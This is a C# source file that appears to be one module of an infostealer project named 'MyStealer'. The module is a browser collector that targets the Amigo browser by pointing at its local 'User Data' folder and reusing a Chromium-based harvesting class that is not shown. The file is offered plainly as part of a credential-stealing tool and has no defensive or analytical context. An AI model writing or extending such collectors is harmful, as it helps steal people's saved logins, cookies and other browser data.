﻿using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    internal class Amigo : Chromium
    {
        public override string ModuleName => "Amigo";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Amigo", "User Data");
    }
}